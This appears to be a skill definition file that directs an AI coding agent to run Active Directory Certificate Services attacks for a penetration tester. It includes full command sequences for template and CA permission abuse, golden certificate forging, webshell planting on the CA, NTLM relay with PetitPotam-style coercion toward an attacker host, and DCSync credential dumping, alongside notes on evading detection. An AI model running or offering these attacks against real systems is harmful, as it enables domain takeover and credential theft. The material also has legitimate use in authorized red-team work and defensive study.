---
name: adcs-access-and-relay
description: >
  Exploits ADCS through ACL abuse on templates/CA objects and NTLM relay to
  enrollment endpoints. Covers ESC4 (template ACL → modify to ESC1), ESC5 (PKI
  object ACLs), ESC7 (ManageCA/ManageCertificates abuse), ESC8 (NTLM relay to
  HTTP enrollment), ESC11 (NTLM relay to ICPR RPC).
keywords:
  - ESC4
  - ESC5
  - ESC7
  - ESC8
  - ESC11
  - template ACL
  - ManageCA
  - ManageCertificates
  - NTLM relay certificate
  - relay to AD CS
  - certsrv relay
  - web enrollment relay
  - ICPR relay
  - certificate template permission
  - modifyCertTemplate
tools:
  - Certipy
  - Certify.exe
  - ntlmrelayx.py
  - modifyCertTemplate.py
  - PetitPotam
  - Rubeus
opsec: medium
---

# ADCS Access Control & Relay Attacks (ESC4 / ESC5 / ESC7 / ESC8 / ESC11)

You are helping a penetration tester exploit ADCS through template/CA access
control abuse and NTLM relay to enrollment endpoints. All testing is under
explicit written authorization.

**Kerberos-first authentication**: ESC4, ESC5, and ESC7 use Kerberos auth for
all operations. ESC8 and ESC11 are inherently NTLM-based (relay attacks) — the
Kerberos-first convention does not apply. These techniques explicitly accept
NTLM detection artifacts (Event 4776, relay signatures) as a necessary cost.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[adcs-access-and-relay] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Domain user credentials (for ESC4/5/7) or ability to coerce NTLM auth (ESC8/11)
- Network access to CA server
- Tools: `certipy`, `Certify.exe`, `ntlmrelayx.py` (Impacket), `modifyCertTemplate.py`,
  coercion tools (PetitPotam, SpoolSample, DFSCoerce)

**Kerberos-first workflow** (ESC4/5/7 only):

```bash
cd $TMPDIR && getTGT.py DOMAIN/user -hashes :NTHASH -dc-ip DC_IP
export KRB5CCNAME=$TMPDIR/user.ccache
# All Certipy/Impacket commands use -k -no-pass
```

**Tool output directory**: `getTGT.py`, `certipy req`, and `certipy auth` write
output files to CWD with no output-path flag. Always prefix with
`cd $TMPDIR &&`. Use `mv` (not `cp`) when saving evidence.

## Privileged Commands

Claude Code cannot execute `sudo` commands. The relay infrastructure tools
require root and must be handed off to the user:

- **ntlmrelayx.py** — NTLM relay listener (ESC8/ESC11, binds SMB/HTTP ports)
- **krbrelayx.py** — Kerberos relay listener (ESC8/ESC11 variant)
- **mitm6** — IPv6 DNS takeover for coercion (used with relay)

**Handoff protocol:** Present the full command including `sudo` to the user.
For relay chains (relay listener + coercion trigger), batch the privileged
commands so the user can start them before Claude triggers coercion.

**Non-privileged commands** Claude can execute directly:
- ACL abuse (ESC4/5/7): `certipy`, `Certify.exe`, `modifyCertTemplate.py`
- Coercion triggers: `PetitPotam.py`, `printerbug.py`, `DFSCoerce.py`
- Certificate auth: `certipy auth`, `Rubeus.exe asktgt`
- Post-exploitation: `secretsdump.py -k -no-pass`

## Step 1: Identify Attack Path

### From BloodHound / enumeration results

| Finding | ESC | Attack Path |
|---------|-----|-------------|
| WriteProperty/WriteDACL on certificate template | ESC4 | Modify template → ESC1 |
| Write access to PKI containers/CA object | ESC5 | Create/publish vulnerable template |
| ManageCA permission on CA | ESC7 | Enable SAN / approve requests / SubCA abuse |
| ManageCertificates permission on CA | ESC7 | Approve pending requests / set extensions |
| HTTP enrollment endpoint (CES/CEP/NDES) | ESC8 | NTLM relay to web enrollment |
| ICPR RPC without encryption enforcement | ESC11 | NTLM relay to RPC enrollment |

### Enumerate CA permissions

```bash
# Certipy — always use -output to avoid writing to CWD
certipy find -k -no-pass -dc-ip DC_IP -vulnerable -output engagement/evidence/certipy-adcs

# Certify — PKI object ACLs
Certify.exe pkiobjects /domain:DOMAIN /showAdmins
Certify.exe find /showAllPermissions
```

### Check for web enrollment endpoints

```bash
# Certify — list CAs with enrollment URLs
Certify.exe cas

# certutil — enrollment server URLs
certutil.exe -enrollmentServerURL -config DC.DOMAIN.LOCAL\DOMAIN-CA
```

### Check ICPR encryption enforcement (ESC11)

```bash
# Certipy find output shows: "Enforce Encryption for Requests: Disabled"
certipy find -k -no-pass -dc-ip DC_IP -stdout | grep -i "enforce encryption"

# On CA server directly
certutil -getreg CA\InterfaceFlags
# Vulnerable if IF_ENFORCEENCRYPTICERTREQUEST is NOT set
```

### Decision tree

```
What access do you have?
├── Write on template object → ESC4 (Step 2)
├── Write on PKI container / CA AD object → ESC5 (Step 3)
├── ManageCA on CA → ESC7 Attack 1 or 2 (Step 4)
├── ManageCertificates on CA → ESC7 Attack 3 (Step 4)
├── Can coerce NTLM auth + HTTP enrollment available → ESC8 (Step 5)
├── Can coerce NTLM auth + ICPR unencrypted → ESC11 (Step 6)
└── No direct access → Escalate or **acl-abuse**
```

## Step 2: ESC4 — Template ACL Abuse

**Conditions**: WriteProperty, WriteDACL, or WriteOwner on a certificate template.
The attacker modifies the template to introduce ESC1 conditions, requests a
certificate with arbitrary SAN, then restores the original configuration.

### Modify template to enable SAN

```bash
# Certipy — save original config, modify template
certipy template 'DOMAIN/user@CA.DOMAIN.LOCAL' -k -no-pass \
  -template 'VulnTemplate' -save-old

# modifyCertTemplate.py — add ENROLLEE_SUPPLIES_SUBJECT flag
python3 modifyCertTemplate.py DOMAIN/user -k -no-pass \
  -template VulnTemplate -dc-ip DC_IP \
  -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag

# StandIn.exe (Windows)
StandIn.exe --adcs --filter VulnTemplate --ess --add
```

### Request certificate (now exploitable as ESC1)

```bash
certipy req -k -no-pass -dc-ip DC_IP -ca 'DOMAIN-CA' \
  -template 'VulnTemplate' -upn 'administrator@domain.local'
```

### Restore original template configuration

```bash
# Certipy — restore from saved config
certipy template 'DOMAIN/user@CA.DOMAIN.LOCAL' -k -no-pass \
  -template 'VulnTemplate' -configuration VulnTemplate.json

# modifyCertTemplate.py — remove flag
python3 modifyCertTemplate.py DOMAIN/user -k -no-pass \
  -template VulnTemplate -dc-ip DC_IP \
  -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag -remove
```

### Authenticate

```bash
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

**OPSEC**: Template modification creates AD replication events. Minimize the
window between modify → request → restore. Use `-save-old` to ensure clean
restoration.

## Step 3: ESC5 — PKI Object ACL Abuse

**Conditions**: Write access to `pKIEnrollmentService` object, Certificate
Templates container, or any descendant in
`CN=Public Key Services,CN=Services,CN=Configuration,DC=DOMAIN,DC=COM`.

### Method 1: Create and publish a vulnerable template

Requires write to the Certificate Templates container + ability to add template
to CA enrollment list.

```bash
# Duplicate an existing template (e.g., User) via LDAP
# Add ENROLLEE_SUPPLIES_SUBJECT flag + client-auth EKU
# Add your user/group to enrollment rights
# Publish to CA via certificateTemplate attribute of pKIEnrollmentService

# Then exploit as ESC1:
certipy req -k -no-pass -dc-ip DC_IP -ca 'DOMAIN-CA' \
  -template 'MaliciousTemplate' -upn 'administrator@domain.local'
```

### Method 2: Golden Certificate via CA key compromise

If you have write access to the CA server AD object and can achieve code
execution on the CA:

```bash
# Extract CA certificate + private key
certipy ca -k -no-pass -target CA.DOMAIN.LOCAL -ca 'DOMAIN-CA' -backup

# Forge certificate for any user
certipy forge -ca-pfx DOMAIN-CA.pfx -upn administrator@domain.local \
  -sid 'S-1-5-21-...-500'

certipy auth -pfx administrator_forged.pfx -dc-ip DC_IP
```

Escalate for full golden certificate technique.

## Step 4: ESC7 — CA Permission Abuse

**Conditions**: ManageCA or ManageCertificates permission on the CA.

### Attack 1: ManageCA → Officer + SAN + SubCA

Use ManageCA to add yourself as CA officer (ManageCertificates), then enable
the SubCA template and issue certificates:

```bash
# Add yourself as CA officer
certipy ca -k -no-pass -ca 'DOMAIN-CA' -add-officer user -dc-ip DC_IP

# Enable SubCA template on CA
certipy ca -k -no-pass -ca 'DOMAIN-CA' -enable-template 'SubCA' -dc-ip DC_IP

# Request SubCA certificate with SAN (will be denied initially)
certipy req -k -no-pass -dc-ip DC_IP -ca 'DOMAIN-CA' \
  -template SubCA -upn administrator@domain.local
# Note: request will fail but key is saved. Note the request ID.

# Issue the denied request (using ManageCertificates permission)
certipy ca -k -no-pass -ca 'DOMAIN-CA' -issue-request REQUEST_ID -dc-ip DC_IP

# Retrieve the issued certificate
certipy req -k -no-pass -dc-ip DC_IP -ca 'DOMAIN-CA' -retrieve REQUEST_ID
```

### Attack 2: ManageCA → Enable ESC6 flag

```bash
# Enable EDITF_ATTRIBUTESUBJECTALTNAME2 (creates ESC6 condition)
Certify.exe setconfig /enablesan /restart

# Or via certutil on CA server
certutil -config "CA_HOST\CA_NAME" \
  -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
net stop certsvc && net start certsvc

# Then exploit via ESC6 — route to **adcs-template-abuse**
```

### Attack 3: ManageCertificates → Extension injection

```bash
# Submit a certificate request (may require approval)
Certify.exe request /ca:CA.DOMAIN.LOCAL\DOMAIN-CA /template:SecureUser

# Set custom extension on the pending request
Certify.exe manage-ca /ca:CA.DOMAIN.LOCAL\DOMAIN-CA /request-id REQUEST_ID \
  /set-extension "1.1.1.1=DER,10,01 01 00 00"

# Approve and download
Certify.exe manage-ca /ca:CA.DOMAIN.LOCAL\DOMAIN-CA /issue /request-id REQUEST_ID
Certify.exe request-download /ca:CA.DOMAIN.LOCAL\DOMAIN-CA /id REQUEST_ID
```

### Attack 4: ManageCA → RCE via CRL/file write

```bash
# Find writable shares via CDP
Certify.exe writefile /ca:CA.DOMAIN.LOCAL\DOMAIN-CA /readonly

# Write webshell to CA web directory
Certify.exe writefile /ca:CA.DOMAIN.LOCAL\DOMAIN-CA \
  /path:C:\Windows\SystemData\CES\CA-Name\shell.aspx \
  /input:C:\path\to\shell.aspx
```

### Cleanup

```bash
# Remove officer permission
certipy ca -k -no-pass -ca 'DOMAIN-CA' -remove-officer user -dc-ip DC_IP

# Disable SubCA template
certipy ca -k -no-pass -ca 'DOMAIN-CA' -disable-template 'SubCA' -dc-ip DC_IP

# Remove ESC6 flag if enabled
certutil -config "CA_HOST\CA_NAME" \
  -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
net stop certsvc && net start certsvc
```

## Step 5: ESC8 — NTLM Relay to HTTP Enrollment

**Conditions**: CA has HTTP enrollment endpoint (CES/CEP/NDES), endpoint lacks
EPA (Extended Protection for Authentication), coercion vector available.

**OPSEC exception**: This is inherently an NTLM relay attack. Kerberos-first
does not apply. Expect NTLM auth events (4776), relay artifacts, and coercion
events (SpoolService/PetitPotam).

### Set up relay

```bash
# Impacket ntlmrelayx — relay to web enrollment
ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Certipy built-in relay
certipy relay -ca CA_IP -template DomainController
```

### Coerce authentication from DC or privileged account

```bash
# PetitPotam (MS-EFSR) — unauthenticated if unpatched
python3 PetitPotam.py -d '' -u '' -p '' ATTACKER_IP DC_IP

# PetitPotam — authenticated
python3 PetitPotam.py -d DOMAIN -u user -p 'Pass' ATTACKER_IP DC_IP

# SpoolSample / Dementor (MS-RPRN — Print Spooler)
python3 dementor.py ATTACKER_IP DC_IP -u user -p 'Pass' -d DOMAIN
SpoolSample.exe DC_IP ATTACKER_IP

# DFSCoerce (MS-DFSNM)
python3 dfscoerce.py -u user -p 'Pass' -d DOMAIN ATTACKER_IP DC_IP
```

### Use obtained certificate

```bash
# ntlmrelayx outputs base64 certificate — save to file
echo "BASE64_CERT" | base64 -d > dc.pfx

# Authenticate via PKINIT
certipy auth -pfx dc.pfx -dc-ip DC_IP

# Or with Rubeus
Rubeus.exe asktgt /user:DC$ /certificate:BASE64_CERT /ptt

# DCSync with obtained DC machine account
export KRB5CCNAME=dc.ccache
secretsdump.py -k -no-pass DC.DOMAIN.LOCAL
```

### Kerberos relay variant (lower OPSEC)

```bash
# krbrelayx — relay Kerberos instead of NTLM (avoids NTLM events)
sudo krbrelayx.py --target http://CA/certsrv \
  -ip ATTACKER_IP --victim DC.DOMAIN.LOCAL --adcs --template Machine

# DNS poisoning via mitm6 for coercion
sudo mitm6 --domain DOMAIN --host-allowlist DC.DOMAIN.LOCAL \
  --relay CA.DOMAIN.LOCAL -v
```

## Step 6: ESC11 — NTLM Relay to ICPR (RPC)

**Conditions**: CA has ICPR RPC endpoint without encryption enforcement
(`IF_ENFORCEENCRYPTICERTREQUEST` not set), coercion vector available.

**OPSEC exception**: Same as ESC8 — inherently NTLM relay.

### Set up relay

```bash
# Certipy relay — target RPC
certipy relay -target rpc://CA_IP -ca 'DOMAIN-CA' -template DomainController

# Impacket ntlmrelayx — RPC mode
ntlmrelayx.py -t rpc://CA_IP -rpc-mode ICPR -icpr-ca-name DOMAIN-CA -smb2support
```

### Coerce authentication

Same coercion vectors as ESC8 (PetitPotam, SpoolSample, DFSCoerce).

### Use obtained certificate

```bash
certipy auth -pfx dc.pfx -dc-ip DC_IP
```

### ESC8 vs ESC11 comparison

| Aspect | ESC8 (HTTP) | ESC11 (RPC) |
|--------|-------------|-------------|
| Protocol | HTTP/HTTPS | RPC (port 135) |
| Relay target | `http://CA/certsrv/certfnsh.asp` | `rpc://CA` |
| Mitigation | EPA on IIS, channel binding | `IF_ENFORCEENCRYPTICERTREQUEST` flag |
| Template | Machine, DomainController | Machine, DomainController |
| Certipy flag | `-ca CA_IP` | `-target rpc://CA_IP` |

## Step 7: Escalate or Pivot

STOP and return to the orchestrator with:
- What was achieved (RCE, creds, file read, etc.)
- New credentials, access, or pivot paths discovered
- Context for next steps (platform, access method, working payloads)

## Troubleshooting

### Template modification not taking effect (ESC4)
AD replication delay. Wait 5-15 minutes or force replication:
`repadmin /syncall /AdeP DC.DOMAIN.LOCAL`. Alternatively, target the CA's DC
directly with `-dc-ip`.

### Relay fails — "authentication failed" (ESC8/11)
EPA or channel binding enabled. Check with `certipy find` output for endpoint
protection status. Try ICPR (ESC11) if HTTP (ESC8) is protected, or vice versa.

### "Request denied" after ManageCA officer add (ESC7)
CA may require restart for new officer permissions to take effect. Use
`net stop certsvc && net start certsvc` if you have CA server access.

### Coerced auth not reaching relay
Firewall blocking SMB from DC to attacker. Verify port 445 reachability. Try
alternative coercion (WebDAV for HTTP coercion, or use a host the DC can reach).

### KRB_AP_ERR_SKEW (Clock Skew)

Kerberos requires clocks within 5 minutes of the DC. This is a **Clock Skew
Interrupt** — stop immediately and return to the orchestrator. Do not retry or
fall back to NTLM. The fix requires root:
```bash
sudo ntpdate DC_IP
# or
sudo rdate -n DC_IP
```

### OPSEC comparison

| ESC | OPSEC | Detection Surface |
|-----|-------|-------------------|
| ESC4 | Medium | Template modification creates AD object change events (5136) |
| ESC5 | High | PKI container modification, potential CA key extraction |
| ESC7 | Medium | CA permission changes, certificate issuance approval events |
| ESC8 | High | NTLM relay events (4776), coercion events, anomalous enrollment |
| ESC11 | High | Same as ESC8 but via RPC instead of HTTP |
